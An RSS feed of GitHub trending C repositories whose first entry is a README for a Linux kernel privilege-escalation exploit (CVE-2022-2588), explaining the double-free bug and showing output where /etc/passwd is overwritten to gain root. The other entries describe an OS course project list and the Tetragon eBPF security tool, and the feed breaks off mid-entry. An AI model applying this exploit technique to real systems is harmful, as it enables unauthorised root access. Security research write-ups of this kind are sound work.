<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-09-23T01:31:38Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>Markakd/CVE-2022-2588</title>
    <updated>2022-09-23T01:31:38Z</updated>
    <id>tag:github.com,2022-09-23:/Markakd/CVE-2022-2588</id>
    <link href="https://github.com/Markakd/CVE-2022-2588" rel="alternate"></link>
    <summary type="html">&lt;p&gt;exploit for CVE-2022-2588&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2022-2588&lt;/h1&gt; &#xA;&lt;h1&gt;The fix&lt;/h1&gt; &#xA;&lt;p&gt;The bug is fixed in Linux v5.19 by this &lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9ad36309e2719a884f946678e0296be10f&#34;&gt;commit&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;The bug&lt;/h1&gt; &#xA;&lt;p&gt;The bug was introduced in Linux v3.17 by this &lt;a href=&#34;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=1109c00547fc66df45b9ff923544be4c1e1bec13&#34;&gt;commit&lt;/a&gt; back to 2014. It requires &lt;code&gt;User Namespaces&lt;/code&gt; to trigger. This bug is very similar to &lt;a href=&#34;https://access.redhat.com/security/cve/cve-2021-3715&#34;&gt;CVE-2021-3715&lt;/a&gt;, which was caused by improper operation on the &lt;code&gt;route4_filter&lt;/code&gt;&#39;s linked list. More details of CVE-2021-3715 could be found at &lt;a href=&#34;https://zplin.me/talks/BHEU21_trash_kernel_bug.pdf&#34;&gt;the blackhat talk&lt;/a&gt; (page 16). The following is some brief details of CVE-2022-2588.&lt;/p&gt; &#xA;&lt;p&gt;The following shows some important code snippets of function &lt;code&gt;route4_change&lt;/code&gt; for understanding CVE-2022-2588.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static int route4_change(...)&#xA;{&#xA;    ...&#xA;    f = kzalloc(sizeof(struct route4_filter), GFP_KERNEL);      [0]&#xA;    ...&#xA;    // if there exists a filter with the same handler, copy some information&#xA;    if (fold) {                                                 [1]&#xA;        f-&amp;gt;id = fold-&amp;gt;id;&#xA;        f-&amp;gt;iif = fold-&amp;gt;iif;&#xA;        f-&amp;gt;res = fold-&amp;gt;res;&#xA;        f-&amp;gt;handle = fold-&amp;gt;handle;&#xA;&#xA;        f-&amp;gt;tp = fold-&amp;gt;tp;&#xA;        f-&amp;gt;bkt = fold-&amp;gt;bkt;&#xA;        new = false;&#xA;    }&#xA;    &#xA;    // initialize the new filter&#xA;    err = route4_set_parms(net, tp, base, f, handle, head, tb,  [2]&#xA;                   tca[TCA_RATE], new, flags, extack);&#xA;    if (err &amp;lt; 0)&#xA;        goto errout;&#xA;&#xA;    // insert the new filter to the list&#xA;    h = from_hash(f-&amp;gt;handle &amp;gt;&amp;gt; 16);                             [3]&#xA;    fp = &amp;amp;f-&amp;gt;bkt-&amp;gt;ht[h];&#xA;    for (pfp = rtnl_dereference(*fp);&#xA;         (f1 = rtnl_dereference(*fp)) != NULL;&#xA;         fp = &amp;amp;f1-&amp;gt;next)&#xA;        if (f-&amp;gt;handle &amp;lt; f1-&amp;gt;handle)&#xA;            break;&#xA;&#xA;    tcf_block_netif_keep_dst(tp-&amp;gt;chain-&amp;gt;block);&#xA;    rcu_assign_pointer(f-&amp;gt;next, f1);&#xA;    rcu_assign_pointer(*fp, f);&#xA;    &#xA;    // remove fold filter from the list if fold exists&#xA;    if (fold &amp;amp;&amp;amp; fold-&amp;gt;handle &amp;amp;&amp;amp; f-&amp;gt;handle != fold-&amp;gt;handle) {    [4]&#xA;        th = to_hash(fold-&amp;gt;handle);&#xA;        h = from_hash(fold-&amp;gt;handle &amp;gt;&amp;gt; 16);&#xA;        b = rtnl_dereference(head-&amp;gt;table[th]);&#xA;        if (b) {&#xA;            fp = &amp;amp;b-&amp;gt;ht[h];&#xA;            for (pfp = rtnl_dereference(*fp); pfp;&#xA;                 fp = &amp;amp;pfp-&amp;gt;next, pfp = rtnl_dereference(*fp)) {&#xA;                if (pfp == fold) {&#xA;                    rcu_assign_pointer(*fp, fold-&amp;gt;next);  [5]// remove the old from the linked list&#xA;                    break;&#xA;                }&#xA;            }&#xA;        }&#xA;    }&#xA;...&#xA;    // free the fold filter if it exists                         [6]&#xA;    if (fold) {&#xA;        tcf_unbind_filter(tp, &amp;amp;fold-&amp;gt;res);&#xA;        tcf_exts_get_net(&amp;amp;fold-&amp;gt;exts);&#xA;        tcf_queue_work(&amp;amp;fold-&amp;gt;rwork, route4_delete_filter_work);&#xA;    }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The function is implemented to initialize/replace &lt;code&gt;route4_filter&lt;/code&gt; object. The filter uses &lt;code&gt;handle&lt;/code&gt; as an unique id to distinguish between each filter. If there exists a handle that has been initialized before (i.e. the &lt;code&gt;fold&lt;/code&gt; variable is not null), it will update the filter by removing the old filter and adding a new filter, otherwise, it will just add a new filter.&lt;/p&gt; &#xA;&lt;p&gt;In [0], kernel allocate the &lt;code&gt;route4_filter&lt;/code&gt; object. In [1], if fold is not empty, which means there exists a filter with the same handle, it will copy some information to the new filter and initialize the new filter in [2], then insert the new filter to the list in [3]. If the old filter exists, it gets removed from list in [4] and gets freed in [6].&lt;/p&gt; &#xA;&lt;p&gt;The bug happens in [4], which checks whether there exists an old filter to be removed. The condition ensures that the handle shouldn&#39;t be zero and it should match with the new filter&#39;s handle. This condition doesn&#39;t align with the condition of freeing the filter in [6], which only checks if the old filter exists. Therefore, if users create a filter whose handle is 0, then trigger the replacement of it, the filter will not be unlinked in [4] but gets freed in [6] since their condition isn&#39;t the same.&lt;/p&gt; &#xA;&lt;h1&gt;The exploitation&lt;/h1&gt; &#xA;&lt;p&gt;Since this bug is similar to CVE-2021-3715, their primitives are nearly the same. Readers could refer to the &lt;a href=&#34;https://zplin.me/talks/BHEU21_trash_kernel_bug.pdf&#34;&gt;the blackhat talk&lt;/a&gt; for more detailed description of primitives. This write-up shows the exploitation with the idea of &lt;a href=&#34;https://zplin.me/papers/DirtyCred-BH22-Zhenpeng.pdf&#34;&gt;DirtyCred&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Since the freed &lt;code&gt;fold&lt;/code&gt; is still on the linked list after triggering the bug, we could free the &lt;code&gt;fold&lt;/code&gt; once again, which eventually will cause a double free on the &lt;code&gt;route4_filer&lt;/code&gt; object and &lt;code&gt;route4_filter-&amp;gt;exts.action&lt;/code&gt; object if &lt;code&gt;CONFIG_NET_CLS_ACT&lt;/code&gt; is enabled.&lt;/p&gt; &#xA;&lt;p&gt;The exploit codes utilize those two double-free capabilities to demonstrate the attack on &lt;a href=&#34;https://www.kernel.org/doc/Documentation/security/credentials.txt&#34;&gt;task credentials&lt;/a&gt; (utilizing kmalloc-192 double free, to be coming) and &lt;a href=&#34;https://www.kernel.org/doc/Documentation/security/credentials.txt&#34;&gt;open file credentials&lt;/a&gt; (utilizing kmalloc-256 double free).&lt;/p&gt; &#xA;&lt;h2&gt;Attacking file credential&lt;/h2&gt; &#xA;&lt;p&gt;Following the idea of &lt;a href=&#34;https://zplin.me/papers/DirtyCred-BH22-Zhenpeng.pdf&#34;&gt;DirtyCred&lt;/a&gt;, the exploit code swaps the file credential after the permission checks, so we could write any content to files with read permission. Ideally, the code could work across all kernel versions affected by the bug. It is noted that in order to make sure the code will work on older kernels where &lt;code&gt;msg_msg&lt;/code&gt; is isolated in &lt;code&gt;kmalloc-rcl-*&lt;/code&gt;, the exploit uses a different spray object.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[zip@localhost ~]$ ./exp_file&#xA;self path /home/zip/./exp_file&#xA;prepare done&#xA;Old limits -&amp;gt; soft limit= 14096          hard limit= 14096&#xA;starting exploit, num of cores: 32&#xA;defrag done&#xA;spray 256 done&#xA;freed the filter object&#xA;256 freed done&#xA;double free done&#xA;spraying files&#xA;found overlap, id : 257, 1061&#xA;start slow write&#xA;closed overlap&#xA;got cmd, start spraying /etc/passwd&#xA;spray done&#xA;write done, spent 1.621078 s&#xA;should be after the slow write&#xA;succeed&#xA;[zip@localhost ~]$ head -n 4 /etc/passwd&#xA;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash&#xA;root&lt;span&gt;❌&lt;/span&gt;0:0:root:/root:/bin/bash&#xA;bin&lt;span&gt;❌&lt;/span&gt;1:1:bin:/bin:/sbin/nologin&#xA;daemon&lt;span&gt;❌&lt;/span&gt;2:2:daemon:/sbin:/sbin/nologin&#xA;[zip@localhost ~]$ su user # the password is user&#xA;Password:&#xA;sh-4.4# id&#xA;uid=0(user) gid=0(root) groups=0(root)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The exploit was written to work on as more distroes as possible, it was tested to be working on&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ubuntu 18 (xxx ~ xxx)&lt;/li&gt; &#xA; &lt;li&gt;Ubuntu 20 (xxx ~ xxx)&lt;/li&gt; &#xA; &lt;li&gt;Centos 8/Stream (xxx ~ xxx)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;(Please feel free to send a PR to update this if you find it could work on other kernels.)&lt;/p&gt; &#xA;&lt;h2&gt;Want to play the exploit in the VM?&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Please login with user &lt;code&gt;low&lt;/code&gt; and password &lt;code&gt;low&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Ubuntu 20&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;nc 150.136.171.117 1337&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Centos 8&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;nc 150.136.171.117 1338&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>remzi-arpacidusseau/ostep-projects</title>
    <updated>2022-09-23T01:31:38Z</updated>
    <id>tag:github.com,2022-09-23:/remzi-arpacidusseau/ostep-projects</id>
    <link href="https://github.com/remzi-arpacidusseau/ostep-projects" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Projects for an undergraduate OS course&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Projects for an Operating Systems Class&lt;/h1&gt; &#xA;&lt;p&gt;This repository holds a number of projects that can be used in an operating systems class aimed at upper-level undergraduates and (in some cases) beginning graduate students. They are based on years of teaching such a course at the University of Wisconsin-Madison.&lt;/p&gt; &#xA;&lt;p&gt;Also (increasingly) available are some tests to see if your code works; eventually every project will have a set of tests available. The testing framework that is currently available is found &lt;a href=&#34;https://github.com/remzi-arpacidusseau/ostep-projects/tree/master/tester&#34;&gt;here&lt;/a&gt;. A specific testing script, found in each project directory, can be used to run the tests against your code.&lt;/p&gt; &#xA;&lt;p&gt;For example, in the initial utilities project, the relatively simple &lt;code&gt;wcat&lt;/code&gt; program that you create can be tested by running the &lt;code&gt;test-wcat.sh&lt;/code&gt; script. This could be accomplished by the following commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;prompt&amp;gt; git clone https://github.com/remzi-arpacidusseau/ostep-projects&#xA;prompt&amp;gt; cd ostep-projects/initial-utilities/wcat&#xA;prompt&amp;gt; emacs -nw wcat.c &#xA;prompt&amp;gt; gcc -o wcat wcat.c -Wall &#xA;prompt&amp;gt; ./test-wcat.sh&#xA;test 1: passed&#xA;test 2: passed&#xA;test 3: passed&#xA;test 4: passed&#xA;test 5: passed&#xA;test 6: passed&#xA;test 7: passed&#xA;prompt&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Of course, this sequence assumes (a) you use &lt;code&gt;emacs&lt;/code&gt; (you should!), (b) your code is written in one shot (impressive!), and (c) that it works perfectly (well done!). Even for simple assignments, it is likely that the compile/run/debug cycle might take a few iterations.&lt;/p&gt; &#xA;&lt;h2&gt;C/Linux Projects&lt;/h2&gt; &#xA;&lt;h3&gt;Initial Projects&lt;/h3&gt; &#xA;&lt;p&gt;These projects are meant to get you warmed up with programming in the C/UNIX environment. None are meant to be particularly hard, but should be enough so that you can get more comfortable programming.&lt;/p&gt; &#xA;&lt;p&gt;Realize the best thing you can do to learn to program in any environment is to program &lt;strong&gt;a lot&lt;/strong&gt;. These small projects are only the beginning of that journey; you&#39;ll have to do more on your own to truly become proficient.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/initial-utilities&#34;&gt;Unix Utilities&lt;/a&gt; (cat, grep, zip/unzip)&lt;/li&gt; &#xA; &lt;li&gt;Sort (text-based)&lt;/li&gt; &#xA; &lt;li&gt;Sort (binary)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/initial-reverse&#34;&gt;Reverse&lt;/a&gt; (very simple reverse program)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Processes and Scheduling&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/processes-shell&#34;&gt;Shell&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Virtual Memory&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Memory Allocator&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Concurrency&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/concurrency-webserver&#34;&gt;Web Server&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/concurrency-pzip&#34;&gt;Parallel Zip&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/concurrency-mapreduce&#34;&gt;MapReduce&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Web Crawler&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;File Systems&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/filesystems-checker&#34;&gt;File System Checker&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Distributed Systems&lt;/h3&gt; &#xA;&lt;h2&gt;Kernel Hacking Projects (xv6)&lt;/h2&gt; &#xA;&lt;p&gt;These projects all are to be done inside the &lt;a href=&#34;https://pdos.csail.mit.edu/6.828/2017/xv6.html&#34;&gt;xv6&lt;/a&gt; kernel based on an early version of Unix and developed at MIT. Unlike the C/Linux projects, these give you direct experience inside a real, working operating system (albeit a simple one).&lt;/p&gt; &#xA;&lt;p&gt;Read the &lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/INSTALL-xv6.md&#34;&gt;install notes&lt;/a&gt; to see how to download the latest xv6 and install the tools you&#39;ll need.&lt;/p&gt; &#xA;&lt;h3&gt;Initial Projects&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/initial-xv6&#34;&gt;Intro To xv6&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Processes and Scheduling&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/scheduling-xv6-lottery&#34;&gt;Scheduling (Lottery)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Virtual Memory&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/vm-xv6-intro&#34;&gt;Virtual Memory (Null Pointer and Read-Only Regions)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Concurrency&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/remzi-arpacidusseau/ostep-projects/master/concurrency-xv6-threads&#34;&gt;Kernel Threads (Basic Implementation)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;File Systems&lt;/h3&gt;</summary>
  </entry>
  <entry>
    <title>cilium/tetragon</title>
    <updated>2022-09-23T01:31:38Z</updated>
    <id>tag:github.com,2022-09-23:/cilium/tetragon</id>
    <link href="https://github.com/cilium/tetragon" rel="alternate"></link>
    <summary type="html">&lt;p&gt;eBPF-based Security Observability and Runtime Enforcement&lt;/p&gt;&lt;hr&gt;&lt;picture&gt; &#xA; &lt;source media=&#34;(prefers-color-scheme: light)&#34; srcset=&#34;https://github.com/cilium/tetragon/releases/download/tetragon-cli/logo.png&#34; width=&#34;400&#34;&gt; &#xA; &lt;img src=&#34;https://github.com/cilium/tetragon/releases/download/tetragon-cli/logo-dark.png&#34; width=&#34;400&#34;&gt; &#xA;&lt;/picture&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://opensource.org/licenses/Apache-2.0&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache_2.0-blue.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;Cilium’s new Tetragon component enables powerful realtime, eBPF-based Security Observability and Runtime Enforcement.&lt;/p&gt; &#xA;&lt;p&gt;Tetragon detects and is able to react to security-significant events, such as&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Process execution events&lt;/li&gt; &#xA; &lt;li&gt;System call activity&lt;/li&gt; &#xA; &lt;li&gt;I/O activity including network &amp;amp; file access&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When used in a Kubernetes environment, Tetragon is Kubernetes-aware - that is, it understands Kubernetes identities such as namespaces, pods and so-on - so that security event detection can be configured in relation to individual workloads.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/docs/images/smart_observability.png&#34; alt=&#34;Tetragon Overview Diagram&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Functionality Overview&lt;/h2&gt; &#xA;&lt;h3&gt;eBPF Real-Time&lt;/h3&gt; &#xA;&lt;p&gt;Tetragon is a runtime security enforcement and observability tool. What this means is Tetragon applies policy and filtering directly in eBPF in the kernel. It performs the filtering, blocking, and reacting to events directly in the kernel instead of sending events to a user space agent.&lt;/p&gt; &#xA;&lt;p&gt;For an observability use case, applying filters directly in the kernel drastically reduces observation overhead. By avoiding expensive context switching and wake-ups, especially for high frequency events, such as send, read, or write operations, eBPF reduces required resources. Instead, Tetragon provides rich filters (file, socket, binary names, namespace/capabilities, etc.) in eBPF, which allows users to specify the important and relevant events in their specific context, and pass only those to the user-space agent.&lt;/p&gt; &#xA;&lt;h3&gt;eBPF Flexibility&lt;/h3&gt; &#xA;&lt;p&gt;Tetragon can hook into any function in the Linux kernel and filter on its arguments, return value, associated metadata that Tetragon collects about processes (e.g., executable names), files, and other properties. By writing tracing policies users can solve various security and observability use cases. We provide a number of examples for these in the repository and highlight some below in the &#39;Getting Started Guide&#39;, but users are encouraged to create new policies that match their use cases. The examples are just that, jumping off points that users can then use to create new and specific policy deployments even potentially tracing kernel functions we did not consider. None of the specifics about which functions are traced and what filters are applied are hard-coded in the engine itself.&lt;/p&gt; &#xA;&lt;p&gt;Critically, Tetragon allows hooking deep in the kernel where data structures can not be manipulated by user space applications avoiding common issues with syscall tracing where data is incorrectly read, maliciously altered by attackers, or missing due to page faults and other user/kernel boundary errors.&lt;/p&gt; &#xA;&lt;p&gt;Many of the Tetragon developers are also kernel developers. By leveraging this knowledge base Tetragon has created a set of tracing policies that can solve many common observability and security use cases.&lt;/p&gt; &#xA;&lt;h3&gt;eBPF Kernel Aware&lt;/h3&gt; &#xA;&lt;p&gt;Tetragon, through eBPF, has access to the Linux kernel state. Tetragon can then join this kernel state with Kubernetes awareness or user policy to create rules enforced by the kernel in real time. This allows annotating and enforcing process namespace and capabilities, sockets to processes, process file descriptor to filenames and so on. For example, when an application changes its privileges we can create a policy to trigger an alert or even kill the process before it has a chance to complete the syscall and potentially run additional syscalls.&lt;/p&gt; &#xA;&lt;h2&gt;Local Development&lt;/h2&gt; &#xA;&lt;p&gt;For getting started with local development, you can refer to the &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/docs/contributing/development/README.md&#34;&gt;Development Guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Docker deployment&lt;/h2&gt; &#xA;&lt;p&gt;For getting started without having to deploy on a Kubernetes cluster, please refer to the &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/docs/deployment/docker/README.md&#34;&gt;Docker deployment guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Kubernetes Quickstart Guide&lt;/h2&gt; &#xA;&lt;p&gt;This Quickstart guide uses a Kind cluster and a helm-based installation to provide a simple way to get a hands on experience with Tetragon and the generated events. These events include monitoring process execution, network sockets, and file access to see what binaries are executing and making network connections or writing to sensitive files.&lt;/p&gt; &#xA;&lt;p&gt;In this scenario, we are going to install a demo application,&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;observe all process execution happening inside a Kubernetes workload&lt;/li&gt; &#xA; &lt;li&gt;detect file access and writes&lt;/li&gt; &#xA; &lt;li&gt;observe network connections that a Kubernetes workload is making&lt;/li&gt; &#xA; &lt;li&gt;detect privileged processes inside a Kubernetes workload&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;While, we use a Kubernetes Kind cluster in this guide, users can also apply the same concepts in other Kubernetes platforms, bare-metal, or VM environments.&lt;/p&gt; &#xA;&lt;h3&gt;Requirements&lt;/h3&gt; &#xA;&lt;p&gt;The base kernel should support &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/#btf-requirement&#34;&gt;BTF&lt;/a&gt; or the BTF file should be placed where Tetragon can read it.&lt;/p&gt; &#xA;&lt;p&gt;For reference, the examples below use this &lt;a href=&#34;https://raw.githubusercontent.com/cilium/tetragon/main/#btf-requirement&#34;&gt;Vagrantfile&lt;/a&gt; and we created our &lt;a href=&#34;https://kind.sigs.k8s.io/docs/user/quick-start/&#34;&gt;Kind&lt;/a&gt; cluster using the defaults options.&lt;/p&gt; &#xA;&lt;h3&gt;Create a cluster&lt;/h3&gt; &#xA;&lt;p&gt;Create a Kubernetes cluster using Kind or GKE.&lt;/p&gt; &#xA;&lt;h4&gt;Kind&lt;/h4&gt; &#xA;&lt;p&gt;Run the following command to create the Kubernetes cluster:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kind create cluster&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;GKE&lt;/h4&gt; &#xA;&lt;p&gt;Run the following command to create a GKE cluster:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;export NAME=&#34;$(whoami)-$RANDOM&#34;&#xA;gcloud container clusters create &#34;${NAME}&#34; \&#xA;  --zone us-west2-a \&#xA;  --num-nodes 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Deploy Tetragon&lt;/h3&gt; &#xA;&lt;p&gt;To install and deploy Tetragon, run the following commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;helm repo add cilium https://helm.cilium.io&#xA;helm repo update&#xA;helm install tetragon cilium/tetragon -n kube-system&#xA;kubectl rollout status -n kube-system ds/tetragon -w&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By default, kube-system pods are filtered for the examples below we use the demo deployment from &lt;a href=&#34;https://docs.cilium.io/en/v1.11/gettingstarted/http/#gs-http&#34;&gt;Cilium&lt;/a&gt; to generate events.&lt;/p&gt; &#xA;&lt;h3&gt;Deploy Demo Application&lt;/h3&gt; &#xA;&lt;p&gt;Once Tetragon is installed, you can use our Demo Application to explore the Security Observability Events:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl create -f https://raw.githubusercontent.com/cilium/cilium/v1.11/examples/minikube/http-sw-app.yaml&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Before going forward, verify that all pods are up and running - it might take several seconds for some pods until they satisfy all the dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kubectl get pods&#xA;NAME                         READY   STATUS    RESTARTS   AGE&#xA;deathstar-6c94dcc57b-7pr8c   1/1     Running   0          10s&#xA;deathstar-6c94dcc57b-px2vw   1/1     Running   0          10s&#xA;tiefighter                   1/1     Running   0          10s&#xA;xwing                        1/1     Running   0          10s&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Explore Security Observability Events&lt;/h3&gt; &#xA;&lt;p&gt;After Tetragon and the Demo Application is up and running you can examine the security and observability events produced by Tetragon in different ways.&lt;/p&gt; &#xA;&lt;h4&gt;Raw JSON events&lt;/h4&gt; &#xA;&lt;p&gt;The first way is to observe the raw json output from the stdout container log:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: If you&#39;re running more than one &lt;code&gt;tetragon&lt;/code&gt; pod then the command above will only print the logs from one of those pods. To print out the logs on all &lt;code&gt;tetragon&lt;/code&gt; pods, you will need to use a filter/selector such as &lt;code&gt;-l app.kubernetes.io/name=tetragon&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The raw JSON events provide Kubernetes API, identity metadata, and OS level process visibility about the executed binary, its parent and the execution time.&lt;/p&gt; &#xA;&lt;h4&gt;Tetragon CLI&lt;/h4&gt; &#xA;&lt;p&gt;A second way is to pretty print the events using the &lt;a href=&#34;https://github.com/cilium/tetragon/releases/tag/tetragon-cli&#34;&gt;Tetragon CLI&lt;/a&gt;. The tool also allows filtering by process, pod, and other fields.&lt;/p&gt; &#xA;&lt;p&gt;You can download and install it by the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;GOOS=$(go env GOOS)&#xA;GOARCH=$(go env GOARCH)&#xA;curl -L --remote-name-all https://github.com/cilium/tetragon/releases/download/tetragon-cli/tetragon-${GOOS}-${GOARCH}.tar.gz{,.sha256sum}&#xA;sha256sum --check tetragon-${GOOS}-${GOARCH}.tar.gz.sha256sum&#xA;sudo tar -C /usr/local/bin -xzvf tetragon-${GOOS}-${GOARCH}.tar.gz&#xA;rm tetragon-${GOOS}-${GOARCH}.tar.gz{,.sha256sum}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(see &lt;a href=&#34;https://github.com/cilium/tetragon/releases/tag/tetragon-cli&#34;&gt;https://github.com/cilium/tetragon/releases/tag/tetragon-cli&lt;/a&gt; for supported &lt;code&gt;GOOS&lt;/code&gt;/&lt;code&gt;GOARCH&lt;/code&gt; binary releases)&lt;/p&gt; &#xA;&lt;p&gt;To start printing events run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetragon observe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Tetragon is able to observe several events, here we provide a few small samples that can be used as a starting point:&lt;/p&gt; &#xA;&lt;h3&gt;Process Execution&lt;/h3&gt; &#xA;&lt;p&gt;This first use case is monitoring process execution, which can be observed with the Tetragon &lt;code&gt;process_exec&lt;/code&gt; and &lt;code&gt;process_exit&lt;/code&gt; JSON events. These events contain the full lifecycle of processes, from fork/exec to exit, including metadata such as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Binary name: Defines the name of an executable file&lt;/li&gt; &#xA; &lt;li&gt;Parent process: Helps to identify process execution anomalies (e.g., if a nodejs app forks a shell, this is suspicious)&lt;/li&gt; &#xA; &lt;li&gt;Command-line argument: Defines the program runtime behavior&lt;/li&gt; &#xA; &lt;li&gt;Current working directory: Helps to identify hidden malware execution from a temporary folder, which is a common pattern used in malwares&lt;/li&gt; &#xA; &lt;li&gt;Kubernetes metadata: Contains pods, labels, and Kubernetes namespaces, which are critical to identify service owners, particularly in a multitenant environments&lt;/li&gt; &#xA; &lt;li&gt;exec_id: A unique process identifier that correlates all recorded 